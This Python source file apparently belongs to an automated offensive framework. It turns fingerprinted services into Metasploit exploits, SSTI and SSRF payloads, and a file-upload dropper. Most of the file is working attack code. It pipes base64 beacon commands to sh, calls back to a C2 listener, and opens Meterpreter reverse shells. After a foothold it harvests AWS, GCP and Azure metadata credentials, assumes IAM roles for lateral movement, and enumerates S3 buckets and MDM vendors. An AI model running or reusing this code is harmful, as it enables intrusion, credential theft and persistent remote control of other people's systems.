    from phantom.automation.post.trojan import (
        trojan_deliver_command, TrojanDeliverer)
    carrier = slots.get("carrier")
    payload = slots.get("payload")
    bundle = slots.get("bundle")
    if carrier and payload and not bundle:
        staging = slots.get("staging")
        deliverer = (TrojanDeliverer(staging) if staging
                     else TrojanDeliverer())
        bundle = deliverer.stage(carrier, payload)
    return trojan_deliver_command(slots.get("dir") or ".", bundle or "")


def _best_fingerprinted_module(wm):
    """The highest-severity CVE module matching a fingerprinted service.

    Returns (module, service_finding) or None. Product/version come from
    the `service` findings (nmap -sV), lower-cased for the registry.
    """
    from phantom.automation.exploit.modules import module_registry
    best = None
    for f in wm.find("service"):
        product = (f.value.get("product") or "").lower()
        if not product:
            continue
        version = str(f.value.get("version") or "")
        module = module_registry.match(product, version or None)
        if module is None:
            continue
        if best is None or module.severity > best[0]:
            best = (module.severity, module, f)
    return (best[1], best[2]) if best else (None, None)


def _dynamic_cve_hit(wm):
    """Best live-NVD correlation hit for the fingerprinted services.

    The static registry covers the curated top; this covers the long tail:
    every fingerprinted product@version not in the registry is queried
    against the live NVD API (cached, offline-safe) and the highest-scoring
    hit is returned as (cve, product, version, score, port) or None.
    """
    try:
        from phantom.automation.exploit.resolver import get_resolver
        from phantom.automation.exploit.modules import module_registry
        from phantom.automation.exploit.modules.registry import normalize_product
    except Exception:
        return None
    best = None
    for f in wm.find("service"):
        product = (f.value.get("product") or "").strip().lower()
        version = str(f.value.get("version") or "").strip()
        if not product or not version:
            continue
        if module_registry.match(product, version):
            continue  # already covered by the static registry
        try:
            hits = get_resolver().lookup(normalize_product(product), version)
        except Exception:
            continue
        for hit in hits or []:
            score = float(hit.get("score") or 0)
            if best is None or score > best[3]:
                port = str(f.value.get("port") or "")
                best = (hit.get("cve", ""), product, version, score, port)
    return best


def _service_exploit_adapter(wm, slots):
    """Version-matched exploit command, built dynamically from the WM.

    Three-tier weaponization:
      1. static registry match (curated, offline, pre-validated probes)
      2. dynamic CVE correlation (live NVD) + msf console `search cve:<id>`
         to discover the weaponizing module — the catalog is genuinely
         dynamic, never a hardcoded long list
      3. no weaponizable module -> CVE_NOTE: knowledge finding (the
         bug-class path / rce_foothold stays the alternative)
    Appends the EXPLOIT: marker so the interpreter records the plan.
    """
    from phantom.automation.exploit.synthesis import (
        synthesize_command, pick_port)
    from phantom.automation.exploit.payloads import PayloadFactory
    from phantom.automation.exploit.modules.registry import ExploitModule
    target = _effective_target(wm)
    platform = _target_os(wm)
    pf = PayloadFactory()
    spec = pf.spec(platform=platform, arch="x64")
    lhost = os.getenv("PHANTOM_C2_HOST", "127.0.0.1")
    lport = int(os.getenv("PHANTOM_C2_PORT", "8080"))

    module, svc = _best_fingerprinted_module(wm)
    if module is not None:
        port = str(svc.value.get("port") or pick_port(module))
        return synthesize_command(module, target, port, payload_spec=spec,
                                  lhost=lhost, lport=lport)

    # dynamic tier: live NVD correlation + msf module discovery
    hit = _dynamic_cve_hit(wm)
    if hit is None:
        raise ValueError(
            "no exploit module matches the fingerprinted services")
    cve, product, version, score, port = hit
    port = port or pick_port(ExploitModule(cve_id=cve, name="", software=product,
                                           description="", msf_module=""), "80")
    try:
        from phantom.automation.runtime.msf import search_module_for_cve
        msf_module = search_module_for_cve(cve)
    except Exception:
        msf_module = None
    if msf_module:
        dyn = ExploitModule(
            cve_id=cve, name=f"{product} (dynamic NVD correlation)",
            software=product,
            description=f"CVE {cve} correlated live; weaponized via msf search",
            msf_module=msf_module, kind="rce", severity=score,
            rank="good", payloads={}, notes="dynamic")
        return synthesize_command(dyn, target, port, payload_spec=spec,
                                  lhost=lhost, lport=lport)
    # knowledge only: no weaponizing module exists / msf unavailable
    return (f"echo CVE_NOTE: cve={cve} software={product} "
            f"version={version} severity={score:g} port={port}")


def _service_exploit_interp(output, wm, slots):
    """Parse EXPLOIT: and CVE_NOTE: markers into exploit-plan findings."""
    from phantom.automation.belief import Finding
    findings = []
    for line in (output or "").splitlines():
        kv = {}
        for chunk in line.split()[1:]:
            if "=" in chunk:
                k, v = chunk.split("=", 1)
                kv[k.strip()] = v.strip()
        if line.startswith("EXPLOIT:"):
            cve = kv.get("cve")
            if not cve:
                continue
            findings.append(Finding(
                kind="exploit_plan", key=cve,
                value={"cve": cve, "software": kv.get("software", ""),
                       "msf_module": kv.get("msf", ""),
                       "kind": kv.get("kind", "rce"),
                       "severity": kv.get("severity", ""),
                       "target": kv.get("target", wm.target),
                       "port": kv.get("port", "")},
                confidence=0.9, source="service_exploit", target=wm.target))
        elif line.startswith("CVE_NOTE:"):
            cve = kv.get("cve")
            if not cve:
                continue
            # knowledge-only: no weaponizing module — recorded so the
            # reasoning engine can still derive bug-class paths, never
            # treated as an RCE plan (kind="note" is ignored by rce_foothold)
            findings.append(Finding(
                kind="exploit_plan", key=cve,
                value={"cve": cve, "software": kv.get("software", ""),
                       "version": kv.get("version", ""),
                       "msf_module": "", "kind": "note",
                       "severity": kv.get("severity", ""),
                       "target": wm.target, "port": kv.get("port", "")},
                confidence=0.6, source="service_exploit", target=wm.target))
    return findings


# ---------------------------------------------------------------------------
# RCE bridge: confirmed candidate -> command execution -> beacon
# ---------------------------------------------------------------------------

def _has_confirmed_rce():
    """Precondition: a CONFIRMED command-execution candidate exists — a
    confirmed SSTI anomaly (endpoint known) or an RCE-kind exploit plan."""
    def _requires_rce(wm: WorldModel) -> bool:
        return _pick_rce_candidate(wm) is not None
    return _requires_rce


def _pick_rce_candidate(wm: WorldModel) -> Optional[Dict[str, Any]]:
    """Highest-value command-execution candidate: confirmed SSTI first
    (endpoint known, deterministic), then RCE-kind exploit plans.
    Returns a dict describing the channel or None."""
    best = None
    for f in wm.find("hunt_anomaly"):
        v = f.value if isinstance(f.value, dict) else {}
        if v.get("cls") != "ssti" or not v.get("confirmed"):
            continue
        try:
            score = float(v.get("score") or 0)
        except (TypeError, ValueError):
            score = 0.0
        if best is None or score > best[0]:
            best = (score, {"channel": "ssti", "port": str(v.get("port") or "80"),
                            "endpoint": v.get("endpoint") or "/",
                            "evidence": v.get("evidence") or ""})
    for f in wm.find("rce_foothold"):
        v = f.value if isinstance(f.value, dict) else {}
        if v.get("key") == "web_upload" or v.get("vector") == "arbitrary-file-upload":
            # reuse the same real-web-app port resolution as the probe
            # (excludes the operator's own C2 listener port)
            _h, port = _web_service_target(wm)
            return {"channel": "web_upload", "port": port,
                    "evidence": v.get("evidence") or ""}
    for f in wm.find("exploit_plan"):
        v = f.value if isinstance(f.value, dict) else {}
        if str(v.get("kind", "")).lower() != "rce":
            continue
        if best is None:
            best = (0.5, {"channel": "msf", "port": str(v.get("port") or ""),
                          "msf_module": v.get("msf_module") or "",
                          "cve": v.get("cve") or ""})
    return best[1] if best else None


def _rce_foothold_adapter(wm, slots):
    """Verify command execution through a confirmed candidate.

    * ssti channel: replace the template expression in the original
      endpoint with an RCE payload that echoes a random marker;
      marker in the response proves arbitrary command execution.
    * ssrf channel: fetch the cloud metadata IAM path through the app's
      SSRF (senior move: SSRF -> cloud IAM creds).
    * msf channel: run the version-matched module and watch for a session.
    """
    cand = _pick_rce_candidate(wm)
    if cand is None:
        raise ValueError("no confirmed command-execution candidate")
    target = _effective_target(wm)
    marker = f"PHANTOM_RCE_{os.urandom(3).hex()}"
    if cand["channel"] == "ssti":
        import urllib.parse
        payload = ("{{ cycler.__init__.__globals__.os.popen("
                   f"'echo {marker}').read() }}")
        endpoint = re.sub(
            r"\{\{.*?\}\}|\$\{.*?\}|\#\{.*?\}|<%=.*?%>",
            urllib.parse.quote(payload, safe=""),
            cand.get("endpoint") or "/")
        return (f"curl -m 10 -s 'http://{target}:{cand['port']}{endpoint}' "
                f"| grep -o '{marker}' && echo RCE:channel=ssti "
                f"marker={marker}")
    if cand["channel"] == "ssrf":
        import urllib.parse
        meta_url = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
        payload = urllib.parse.quote(meta_url, safe="")
        endpoint = re.sub(
            r"https?://[^&'\"\\ ]+", payload,
            cand.get("endpoint") or "/?url=", count=1)
        return (f"curl -m 10 -s 'http://{target}:{cand['port']}{endpoint}' "
                f"| grep -Eo 'AccessKeyId|SecretAccessKey|Token' "
                f"| head -1 && echo RCE:channel=ssrf marker={marker}")
    if cand["channel"] == "msf":
        module = cand.get("msf_module", "")
        port = cand.get("port") or ""
        if not module:
            raise ValueError("RCE plan without msf module")
        rport = f"; set RPORT {port}" if port else ""
        return (f"msfconsole -q -x \"use {module}; set RHOSTS {target}"
                f"{rport}; set PAYLOAD linux/x64/meterpreter/reverse_tcp; "
                "run; exit -y\" | tee /dev/stderr | grep -E "
                f"'session \\d+ opened|Meterpreter session' "
                f"&& echo RCE:channel=msf marker={marker}")
    raise ValueError(f"unsupported RCE channel: {cand['channel']}")


def _rce_foothold_interp(output, wm, slots):
    """Parse RCE: markers into a confirmed foothold finding."""
    from phantom.automation.belief import Finding
    findings = []
    out = output or ""
    ch = ""
    marker = ""
    for line in out.splitlines():
        if line.startswith("RCE:"):
            for chunk in line[len("RCE:"):].split():
                if "=" in chunk:
                    k, v = chunk.split("=", 1)
                    if k == "channel":
                        ch = v.strip()
                    elif k == "marker":
                        marker = v.strip()
    if not ch:
        return findings
    key = f"{ch}:{marker or os.urandom(3).hex()}"
    if ch == "ssrf" and "AccessKeyId" in out:
        findings.append(Finding(
            kind="cloud_creds", key="iam",
            value={"provider": "aws", "channel": "ssrf",
                   "evidence": out[:300]},
            confidence=0.8, source="rce_foothold", target=wm.target))
    findings.append(Finding(
        kind="rce_foothold", key=key,
        value={"channel": ch, "marker": marker, "evidence": out[:300]},
        confidence=0.9, source="rce_foothold", target=wm.target))
    return findings


def _beacon_via_rce_adapter(wm, slots):
    """Inject our beacon dropper THROUGH the confirmed RCE channel — the
    senior move that turns a confirmed code-execution primitive into
    C2 access without credentials.

    * ssti channel: template-engine RCE payload executing the dropper
      (base64 to dodge quote/space escaping).
    * msf channel: re-run the version-matched exploit module, then push
      the dropper through the opened Meterpreter session (sessions -c).
    """
    cand = _pick_rce_candidate(wm)
    if cand is None:
        raise ValueError("no confirmed RCE channel")
    beacon_cmd = slots.get("command") or ""
    if not beacon_cmd:
        raise ValueError("no beacon command to deliver")
    if cand["channel"] == "web_upload":
        import base64
        import tempfile
        import uuid
        from phantom.utils.beacon_auth import issue_client_certificate
        from phantom.utils.paths import certs_dir
        # mTLS is ON by default: the dropper's curl download from our
        # listener is rejected without a client cert. Issue a beacon client
        # certificate (signed by the listener's CA) and embed it in the
        # uploaded script so the download authenticates.
        try:
            bid = f"B-{uuid.uuid4().hex[:16].upper()}"
            mat = issue_client_certificate(bid, certs_dir())
            cert_b64 = base64.b64encode(
                mat["client_cert_pem"].encode()).decode()
            key_b64 = base64.b64encode(
                mat["client_key_pem"].encode()).decode()
        except Exception:
            cert_b64 = key_b64 = ""
        fixed = beacon_cmd
        if cert_b64 and key_b64:
            fixed = beacon_cmd.replace(
                "curl -sk ",
                "curl -sk --cert /tmp/.pcrt --key /tmp/.pkey ", 1)
        b64 = base64.b64encode(fixed.encode()).decode()
        # the upload endpoint EXECUTES .py files: upload a one-liner that
        # writes the client cert, then base64-decodes and runs the dropper.
        # The dropper is launched DETACHED: the web handler kills its
        # subprocess after a few seconds, so it must survive to finish
        # downloading/starting the beacon.
        payload = ("import os,base64\n"
                   f"open('/tmp/.pcrt','wb').write("
                   f"base64.b64decode('{cert_b64}'))\n"
                   f"open('/tmp/.pkey','wb').write("
                   f"base64.b64decode('{key_b64}'))\n"
                   f"os.system('(echo {b64} | base64 -d | sh) "
                   ">/dev/null 2>&1 &')\n")
        with tempfile.NamedTemporaryFile("w", suffix=".txt", delete=False) as tf:
            tf.write(payload)
            tmp = tf.name
        target = _effective_target(wm)
        scheme = "https" if str(cand.get("port")) in ("443", "8443") else "http"
        return (f"curl -m 25 -s -F 'file=@{tmp};filename=probe.py' "
                f"{scheme}://{target}:{cand['port']}/upload "
                ">/dev/null && echo PHANTOM_RCE_DELIVERED")
    if cand["channel"] == "ssti":
        import base64
        import urllib.parse
        b64 = base64.b64encode(beacon_cmd.encode()).decode()
        # base64 keeps the injected command free of quote/space escaping;
        # `base64 -d | sh` executes the dropper on the target (Linux-first).
        payload = ("{{ cycler.__init__.__globals__.os.popen("
                   f"'echo {b64} | base64 -d | sh').read() }}")
        endpoint = re.sub(
            r"\{\{.*?\}\}|\$\{.*?\}|\#\{.*?\}|<%=.*?%>",
            urllib.parse.quote(payload, safe=""),
            cand.get("endpoint") or "/")
        target = _effective_target(wm)
        return (f"curl -m 25 -s 'http://{target}:{cand['port']}{endpoint}' "
                "-o /dev/null && echo PHANTOM_RCE_DELIVERED")
    if cand["channel"] == "msf":
        return _msf_beacon_delivery(wm, cand, beacon_cmd)
    raise ValueError(f"beacon injection over channel "
                     f"{cand['channel']} not supported")


def _msf_beacon_delivery(wm, cand, beacon_cmd):
    """Deliver the beacon through a Meterpreter session: run the
    version-matched exploit module with a reverse payload, wait for the
    session, then push the dropper into it via `sessions -c`."""
    import base64
    module = cand.get("msf_module", "")
    if not module:
        raise ValueError("RCE plan without msf module")
    target = _effective_target(wm)
    port = str(cand.get("port") or "")
    os_name = _target_os(wm).lower()
    payload = ("windows/x64/meterpreter/reverse_tcp"
               if "windows" in os_name
               else "linux/x64/meterpreter/reverse_tcp")
    lhost = os.getenv("PHANTOM_C2_HOST", "127.0.0.1")
    lport = int(os.getenv("PHANTOM_C2_PORT", "8080"))
    b64 = base64.b64encode(beacon_cmd.encode()).decode()
    exec_cmd = f"echo {b64} | base64 -d | sh"
    rport = f"; set RPORT {port}" if port else ""
    return (
        f"msfconsole -q -x \"use {module}; set RHOSTS {target}{rport}; "
        f"set PAYLOAD {payload}; set LHOST {lhost}; set LPORT {lport}; "
        f"set ExitOnSession false; run -j; sleep 25; "
        f"sessions -c '{exec_cmd}'; exit -y\" "
        f"&& echo PHANTOM_RCE_DELIVERED"
    )


def _env_internal_adapter(wm, slots):
    """Environment probe FROM INSIDE the beacon: container markers and
    AWS metadata via the IMDS v2 token flow. Only meaningful post-beacon
    (link-local metadata is reachable only from the box itself)."""
    return (
        "echo __ENV_BEGIN__; "
        "cat /proc/1/cgroup 2>/dev/null "
        "| grep -Eo 'docker|kubepods|containerd|lxc' | head -1; "
        "test -f /.dockerenv && echo __ENV_CONTAINER__; "
        "TOKEN=$(curl -m 2 -s -X PUT 'http://169.254.169.254/latest/api/token' "
        "-H 'X-aws-ec2-metadata-token-ttl-seconds: 60'); "
        "curl -m 2 -s -H \"X-aws-ec2-metadata-token: $TOKEN\" "
        "http://169.254.169.254/latest/meta-data/ 2>/dev/null | head -5; "
        "echo __ENV_END__"
    )


def _env_probe_adapter(wm, slots):
    """Recognize the environment from the OUTSIDE: exposed management
    APIs (Docker/K8s) and SCADA/ICS port classes. Cloud metadata is NOT
    probed from the operator box (link-local would leak the OPERATOR's
    own cloud, not the target's) — it is reached through SSRF or the
    beacon instead."""
    target = _effective_target(wm)
    ports = {str(s.value.get("port") or "") for s in wm.find("service")
             if isinstance(s.value, dict)}
    names = " ".join(str(s.value.get("service") or "").lower()
                     for s in wm.find("service")
                     if isinstance(s.value, dict))
    cmds = []
    if "2375" in ports or "2376" in ports:
        cmds.append(f"curl -m 4 -s http://{target}:2375/version "
                    "2>/dev/null | head -c 300 && echo __ENV_DOCKER__")
        cmds.append(f"curl -m 4 -s http://{target}:2375/containers/json "
                    "2>/dev/null | head -c 200 && echo __ENV_DOCKER_PS__")
    if any(p in ports for p in ("6443", "10250", "10255")):
        cmds.append(f"curl -m 4 -sk https://{target}:6443/version "
                    "2>/dev/null | head -c 300 && echo __ENV_K8S__")
    if any(p in ports for p in ("502", "102", "20000", "47808", "4840")):
        cmds.append(f"echo __ENV_SCADA__ && "
                    f"echo 'scada/ics ports open: 502,102,20000,47808,4840'")
    if "modbus" in names or "s7" in names or "dnp3" in names:
        cmds.append(f"echo __ENV_SCADA__ && echo 'scada/ics protocol: {names}'")
    if not cmds:
        cmds.append(f"echo __ENV_NONE__ && echo 'no management APIs detected'")
    return " ; ".join(cmds)


def _env_probe_interp(output, wm, slots):
    """Parse __ENV_* markers (and raw container/cloud signals) into an
    `environment` finding. Shared by the outside probe and the internal
    (post-beacon) probe."""
    from phantom.automation.belief import Finding
    out = output or ""
    kinds = []
    if "__ENV_DOCKER__" in out:
        kinds.append({"kind": "container", "engine": "docker",
                      "detail": "Docker API reachable (2375)"})
    elif re.search(r"\b(docker|kubepods|containerd)\b", out):
        kinds.append({"kind": "container", "detail": "container markers inside the box"})
    if "__ENV_K8S__" in out:
        kinds.append({"kind": "kubernetes", "detail": "Kubernetes API reachable (6443)"})
    if "__ENV_SCADA__" in out:
        kinds.append({"kind": "scada", "detail": "SCADA/ICS protocols exposed"})
    if re.search(r"\b(ami-id|instance-id)\b", out):
        kinds.append({"kind": "cloud", "provider": "aws",
                      "detail": "AWS metadata reachable from inside the box"})
    if not kinds:
        return []
    return [Finding(
        kind="environment", key="env",
        value={"kinds": kinds, "raw": out[:300]},
        confidence=0.7, source="env_probe", target=wm.target)]


# ---------------------------------------------------------------------------
# cloud / IAM credentials harvesting (post-beacon)
# ---------------------------------------------------------------------------

def _cloud_creds_adapter(wm, slots):
    """Capture cloud instance credentials from inside the beacon via the
    metadata services. Tries each provider's metadata endpoint."""
    return (
        "echo __CLOUD_START__; "
        # AWS IMDSv2 (token then role creds)
        "T=$(curl -m 2 -s -X PUT 'http://169.254.169.254/latest/api/token' "
        "-H 'X-aws-ec2-metadata-token-ttl-seconds: 60' 2>/dev/null); "
        "R=$(curl -m 2 -s -H \"X-aws-ec2-metadata-token: $T\" "
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/ "
        "2>/dev/null | head -1); "
        "test -n \"$R\" && echo __CLOUD_AWS_ROLE__=$R && "
        "curl -m 2 -s -H \"X-aws-ec2-metadata-token: $T\" "
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/$R "
        "2>/dev/null | grep -Eo '\"(AccessKeyId|SecretAccessKey|Token)\"\\s*:\\s*\"[^\"]+\"' "
        "| head -3; "
        # GCP metadata
        "curl -m 2 -s -H 'Metadata-Flavor: Google' "
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/ "
        "2>/dev/null | head -2 && echo __CLOUD_GCP__; "
        # Azure (managed identity) — needs the identity endpoint via IMDS
        "curl -m 2 -s -H 'Metadata: true' "
        "'http://169.254.169.254/metadata/instance?api-version=2021-02-01' "
        "2>/dev/null | head -c 200 && echo __CLOUD_AZURE__; "
        "echo __CLOUD_END__"
    )


def _cloud_creds_interp(output, wm, slots):
    """Parse __CLOUD_* markers into a cloud_creds + environment finding."""
    from phantom.automation.belief import Finding
    out = output or ""
    findings = []
    provider = ""
    if "__CLOUD_AWS_ROLE__" in out and "AccessKeyId" in out:
        provider = "aws"
        findings.append(Finding(
            kind="cloud_creds", key="iam_aws",
            value={"provider": "aws", "via": "metadata",
                   "evidence": out[:500]},
            confidence=0.95, source="cloud_creds_harvest", target=wm.target))
    elif "__CLOUD_GCP__" in out:
        provider = "gcp"
        findings.append(Finding(
            kind="cloud_creds", key="iam_gcp",
            value={"provider": "gcp", "via": "metadata",
                   "evidence": out[:400]},
            confidence=0.8, source="cloud_creds_harvest", target=wm.target))
    elif "__CLOUD_AZURE__" in out:
        provider = "azure"
        findings.append(Finding(
            kind="cloud_creds", key="identity_azure",
            value={"provider": "azure", "via": "metadata",
                   "evidence": out[:400]},
            confidence=0.8, source="cloud_creds_harvest", target=wm.target))
    if provider:
        findings.append(Finding(
            kind="cloud_creds", key="provider",
            value={"provider": provider, "from": "beacon"},
            confidence=0.9, source="cloud_creds_harvest", target=wm.target))
    return findings


def _cloud_s3_adapter(wm, slots):
    """Enumerate cloud object storage with harvested IAM creds: AWS whoami
    + bucket listing. Provider selection is read from the finding."""
    provider = (slots.get("provider") or "aws").lower()
    if provider == "aws":
        return ("aws sts get-caller-identity 2>/dev/null; "
                "aws s3 ls 2>/dev/null && echo __CLOUD_S3_OK__ || "
                "echo __CLOUD_S3_NONE__")
    if provider == "gcp":
        return ("gcloud auth list 2>/dev/null; "
                "gsutil ls 2>/dev/null && echo __CLOUD_S3_OK__ || "
                "echo __CLOUD_S3_NONE__")
    return ("echo __CLOUD_S3_NONE__ && echo 'provider not supported for "
            f"s3 enum: {provider}'")


# ---------------------------------------------------------------------------
# cloud lateral movement (IAM roles -> STS -> cross-account) — planner-grade
# ---------------------------------------------------------------------------

def _cloud_iam_enum_adapter(wm, slots):
    """With harvested AWS creds: enumerate attached role policies, list
    roles the identity can assume (iam:ListRoles read-only), and pull the
    account alias/ID. Read-only API calls (no privilege change)."""
    return (
        "echo __IAM_START__; "
        "A=$(aws sts get-caller-identity --query Account --output text 2>/dev/null); "
        "echo account=$A; "
        "aws iam list-roles --query 'Roles[*].[RoleName,Arn]' --output text 2>/dev/null "
        "| head -15; "
        "aws iam get-account-summary --output json 2>/dev/null | head -c 400; "
        "echo; echo __IAM_END__"
    )


def _cloud_iam_enum_interp(output, wm, slots):
    """Parse role enumeration into cloud_access + cloud_lateral findings."""
    from phantom.automation.belief import Finding
    out = output or ""
    if "__IAM_START__" not in out:
        return []
    findings = []
    roles = []
    account = ""
    for ln in out.splitlines():
        ln = ln.strip()
        if ln.startswith("account="):
            account = ln.split("=", 1)[1]
        elif "arn:aws:iam::" in ln and ":role/" in ln:
            # 'RoleName\tarn:aws:iam::ACCOUNT:role/NAME' or a bare ARN line
            part = ln.split("\t")[-1].strip()
            if part.startswith("arn:aws:iam::"):
                roles.append(part)
            else:
                # whole line IS the ARN (no tab in output)
                import re as _re
                m = _re.search(r"arn:aws:iam::\d+:role/\S+", ln)
                if m:
                    roles.append(m.group(0))
    if account:
        findings.append(Finding(
            kind="cloud_access", key="account",
            value={"account_id": account, "via": "iam_enum"},
            confidence=0.9, source="cloud_iam_enum", target=wm.target))
    if roles:
        findings.append(Finding(
            kind="cloud_lateral", key="roles",
            value={"role_arns": roles[:15], "count": len(roles),
                   "account_id": account},
            confidence=0.85, source="cloud_iam_enum", target=wm.target))
    return findings


def _cloud_assume_role_adapter(wm, slots):
    """Assume a discovered IAM role via STS (temporary credential set),
    then verify the new identity with get-caller-identity. Role ARN comes
    from the cloud_lateral finding."""
    role_arn = str(slots.get("role_arn") or "")
    if not role_arn.startswith("arn:aws:iam:"):
        return "echo 'no valid role ARN in slot'"
    return (
        "echo __ASSUME_START__; "
        f"C=$(aws sts assume-role --role-arn {role_arn} --role-session-name phantom-lateral "
        "--query 'Credentials.[AccessKeyId,SecretAccessKey,SessionToken]' --output text 2>/dev/null); "
        "if [ -n \"$C\" ]; then "
        "set -- $C; "
        "AWS_ACCESS_KEY_ID=$1 AWS_SECRET_ACCESS_KEY=$2 AWS_SESSION_TOKEN=$3 "
        "aws sts get-caller-identity --output text 2>/dev/null | head -2; "
        "echo __ASSUME_OK__; else echo __ASSUME_DENIED__; fi"
    )


def _cloud_assume_role_interp(output, wm, slots):
    from phantom.automation.belief import Finding
    out = output or ""
    if "__ASSUME_OK__" in out:
        return [Finding(
            kind="cloud_lateral", key="assumed",
            value={"role_arn": slots.get("role_arn", ""),
                   "evidence": out[:400], "status": "assumed"},
            confidence=0.95, source="cloud_assume_role", target=wm.target)]
    if "__ASSUME_DENIED__" in out:
        return [Finding(
            kind="cloud_lateral", key="denied",
            value={"role_arn": slots.get("role_arn", ""), "status": "denied"},
            confidence=0.6, source="cloud_assume_role", target=wm.target)]
    return []


def _cloud_cross_account_adapter(wm, slots):
    """With an assumed role: enumerate cross-account visibility — list S3
    buckets under the assumed identity and check org structure read-only."""
    return (
        "echo __XACCT_START__; "
        "aws s3 ls 2>/dev/null | head -10; "
        "aws organizations list-accounts --query 'Accounts[*].[Id,Name]' --output text 2>/dev/null | head -10; "
        "aws lambda list-functions --query 'Functions[*].FunctionName' --output text 2>/dev/null | head -5; "
        "echo __XACCT_END__"
    )


def _cloud_cross_account_interp(output, wm, slots):
    from phantom.automation.belief import Finding
    out = output or ""
    if "__XACCT_START__" not in out:
        return []
    findings = []
    body = out.split("__XACCT_START__")[-1].split("__XACCT_END__")[0]
    buckets = [ln.split()[2] if len(ln.split()) > 2 else ln.strip()
               for ln in body.splitlines() if ln.strip().startswith("20")]
    if buckets:
        findings.append(Finding(
            kind="cloud_access", key="cross_account_buckets",
            value={"buckets": buckets[:10], "via": "assumed_role"},
            confidence=0.85, source="cloud_cross_account", target=wm.target))
    if "arn:aws:organizations" in body or any(l.strip() and not l.strip().startswith(("20", "#")) for l in body.splitlines()):
        findings.append(Finding(
            kind="cloud_lateral", key="cross_account_recon",
            value={"detail": body[:400], "via": "assumed_role"},
            confidence=0.7, source="cloud_cross_account", target=wm.target))
    return findings


def _cloud_s3_interp(output, wm, slots):
    from phantom.automation.belief import Finding
    out = output or ""
    ok = "__CLOUD_S3_OK__" in out
    if "GetCallerIdentity" in out and "arn:" in out:
        return [Finding(kind="cloud_access", key="iam_valid",
                        value={"arn": out.split("arn:")[-1].split()[0].split("\"")[0],
                               "evidence": out[:400]},
                        confidence=0.95, source="cloud_s3_enum",
                        target=wm.target)]
    if ok:
        return [Finding(kind="cloud_access", key="s3",
                        value={"bucket_list": out[:500], "ok": True},
                        confidence=0.9, source="cloud_s3_enum", target=wm.target)]
    return []


# ---------------------------------------------------------------------------
# mobile / device-management surface
# ---------------------------------------------------------------------------

def _mobile_probe_adapter(wm, slots):
    """Probe for mobile or device-management infrastructure: MDM endpoints,
    push gateways (APNS/GCM), and mobile-web user agents."""
    target = _effective_target(wm)
    cmds = []
    for ep in ("/api/v2/mdm", "/enroll", "/api/device", "/config/mobile",
               "/v1/push", "/push", "/apns", "/gcm", "/fcm"):
        cmds.append(f"curl -m 3 -sk -A 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 "
                    f"like Mac OS X) AppleWebKit/605.1.15' "
                    f"http://{target}{ep} -o /dev/null -w '%{{http_code}}:{ep}' "
                    f"2>/dev/null")
    cmds.append(
        f"curl -m 3 -sk -A 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac "
        f"OS X) AppleWebKit/605.1.15' http://{target}/ -o /dev/null "
        f"-w '%{{http_code}}:home-mobile' 2>/dev/null "
        f"| grep -E ':200|:302|:301' "
        f"&& echo __MOBILE_WEB__")
    # common mobile port classes only probed if the scanner did not see them
    return " ; ".join(cmds)


def _mobile_probe_interp(output, wm, slots):
    from phantom.automation.belief import Finding
    out = output or ""
    # adapter emits '<http_code>:<path>' (curl -w '%{http_code}:...') —
    # the code comes BEFORE the colon, so match '200:'/'301:'/'302:'
    hits = [ln for ln in out.split(";")
            if any(ln.startswith(f"{code}:")
                   for code in ("200", "301", "302"))]
    labels = []
    for ln in hits:
        ep = ln.split(":", 1)[-1].strip()
        for m in ("mdm", "enroll", "device", "mobile", "push", "apns",
                  "gcm", "fcm"):
            if m in ep.lower():
                labels.append(ep)
    if "__MOBILE_WEB__" in out or labels:
        return [Finding(kind="mobile", key="surface",
                        value={"endpoints": labels or ["home-mobile"],
                               "detail": "mobile/device-management surface"},
                        confidence=0.7, source="mobile_probe", target=wm.target)]
    return []


# ---------------------------------------------------------------------------
# MDM vendor fingerprinting (active mobile recon)
# ---------------------------------------------------------------------------

_MDM_SIGNATURES = {
    "jamf": ["jamf", "/casper/", "/computers", "JamfPro"],
    "intune": ["intune", "manage.microsoft.com", "Endpoint Management"],
    "mobileiron": ["mobileiron", "/mifs/", "Ivanti"],
    "airwatch": ["airwatch", "awcm", "Workspace ONE", "workspaceone"],
    "kandji": ["kandji", "/api/v1/prism"],
    "simplemdm": ["simplemdm", "/api/v1/devices"],
}


def _mdm_fingerprint_adapter(wm, slots):
    """Vendor-class an MDM endpoint: probe the enrollment + API surface
    with MDM user-agents and grep vendor signatures. Read-only."""
    target = slots.get("base_url") or _effective_target(wm)
    ua_ios = "MDM/1.0 (Macintosh; Mac OS X)"
    return (
        "echo __MDM_START__; "
        f"for p in / /enroll /mypolicies /api/v1 /api/mdm /BYOD /discovery; do "
        f"code=$(curl -m 4 -sk -A '{ua_ios}' -o /tmp/_mdm_probe -w '%{{http_code}}' "
        f"\"http://{target}$p\" 2>/dev/null); "
        "echo \"PATH:$p:CODE:$code\"; "
        "head -c 300 /tmp/_mdm_probe 2>/dev/null; echo; done; "
        "echo __MDM_END__"
    )


def _mdm_fingerprint_interp(output, wm, slots):
    from phantom.automation.belief import Finding
    out = output or ""
    if "__MDM_START__" not in out:
        return []
    body = out.split("__MDM_START__")[-1].split("__MDM_END__")[0].lower()
    findings = []
    vendors = []
    for vendor, sigs in _MDM_SIGNATURES.items():
        if any(s.lower() in body for s in sigs):
            vendors.append(vendor)
    open_paths = []
    for ln in body.splitlines():
        if ln.startswith("path:") and ":code:200" in ln:
            open_paths.append(ln.split("path:")[1].split(":code:")[0])
    if vendors or open_paths:
        findings.append(Finding(
            kind="mdm_vendor", key="fingerprint",
            value={"vendors": vendors, "open_paths": open_paths[:8],
                   "auth_hint": ("saml" if "saml" in body else
                                 "entra" if ("entra" in body or "login.microsoft" in body)
                                 else "unknown")},
            confidence=0.8 if vendors else 0.55,
            source="mobile_mdm_fingerprint", target=wm.target))
    return findings


# ---------------------------------------------------------------------------
# kubernetes escape surface
# ---------------------------------------------------------------------------

def _has_k8s():
    """True when the box (or its env probe) indicates a running Kubernetes
    pod: K8s service-account, pod token, or an environment flag."""
    def _requires_k8s(wm: WorldModel) -> bool:
        for f in wm.find("environment"):
            v = f.value if isinstance(f.value, dict) else {}
            kinds = v.get("kinds") or []
            labels = [str(k.get("kind", "")) for k in kinds] if kinds else []
            if "kubernetes" in labels:
                return True
        for f in wm.find("container_info"):
            return True
        return False
    return _requires_k8s


